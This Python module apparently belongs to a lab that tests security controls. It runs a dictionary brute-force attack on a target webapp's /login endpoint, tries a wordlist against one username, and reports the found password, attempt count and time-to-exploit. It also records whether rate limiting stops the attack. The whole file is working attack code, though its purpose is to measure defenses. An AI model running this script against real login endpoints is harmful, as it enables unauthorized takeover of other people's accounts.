"""
Brute Force Login Attack
=========================
Simulates a credential-stuffing / dictionary attack against the /login endpoint.

Behaviour with controls:
    ✅ RATE_LIMIT ON  → blocked after 5 attempts (429), attack fails or is very slow
    ✅ INPUT_SANITIZATION ON → passwords with special chars get stripped, reducing match chance
    ❌ Controls OFF → all passwords tried rapidly, correct one found quickly

Output:
    {
        "attack": "brute_force",
        "success": true/false,
        "tte": <seconds>,
        "attempts": <int>,
        "details": "..."
    }
"""

import time
import requests

from config import TARGET_URL, PASSWORD_LIST


def run_brute_force(target_username: str = "user1",
                    password_list: list = None,
                    verbose: bool = True) -> dict:
    """
    Execute a brute-force login attack against the target webapp.

    Args:
        target_username: The username to attack.
        password_list:   Optional custom wordlist; defaults to config.PASSWORD_LIST.
        verbose:         Print progress to stdout.

    Returns:
        dict with keys: attack, success, tte, attempts, details
    """
    if password_list is None:
        password_list = PASSWORD_LIST

    login_url = f"{TARGET_URL}/login"
    start_time = time.time()
    attempts = 0
    success = False
    details = ""

    if verbose:
        print(f"\n{'='*60}")
        print(f"  🔓 BRUTE FORCE ATTACK")
        print(f"  Target : {login_url}")
        print(f"  User   : {target_username}")
        print(f"  Wordlist size : {len(password_list)}")
        print(f"{'='*60}\n")

    for password in password_list:
        attempts += 1

        try:
            response = requests.post(
                login_url,
                json={"username": target_username, "password": password},
                timeout=5,
            )
        except requests.ConnectionError:
            details = "Connection refused — is the target webapp running?"
            if verbose:
                print(f"  ❌ Connection error. Aborting.")
            break

        status = response.status_code

        if status == 429:
            # Rate‑limited — attack is being blocked
            details = f"Rate limited after {attempts} attempts"
            if verbose:
                print(f"  [{attempts:>3}] {password:<20} → 429 RATE LIMITED ⛔")
                print(f"        Attack blocked by rate limiter.")
            break

        if status == 200:
            data = response.json()
            if "Login successful" in data.get("message", ""):
                success = True
                details = f"Password found: '{password}' after {attempts} attempts"
                if verbose:
                    print(f"  [{attempts:>3}] {password:<20} → 200 SUCCESS ✅")
                break
            else:
                if verbose:
                    print(f"  [{attempts:>3}] {password:<20} → 200 (unexpected response)")

        elif status == 401:
            if verbose:
                print(f"  [{attempts:>3}] {password:<20} → 401 wrong password")

        else:
            if verbose:
                print(f"  [{attempts:>3}] {password:<20} → {status}")

    elapsed = round(time.time() - start_time, 4)

    result = {
        "attack": "brute_force",
        "attack_type": "Brute Force Login",
        "success": success,
        "tte": elapsed,
        "attempts": attempts,
        "details": details,
    }

    if verbose:
        print(f"\n{'─'*60}")
        print(f"  Result  : {'✅ SUCCESS' if success else '❌ FAILED'}")
        print(f"  TTE     : {elapsed}s")
        print(f"  Attempts: {attempts}")
        print(f"  Details : {details}")
        print(f"{'─'*60}\n")

    return result


# ─── Standalone execution ────────────────────────────────────────────────────
if __name__ == "__main__":
    result = run_brute_force()
    print("\nRaw result:")
    import json
    print(json.dumps(result, indent=2))
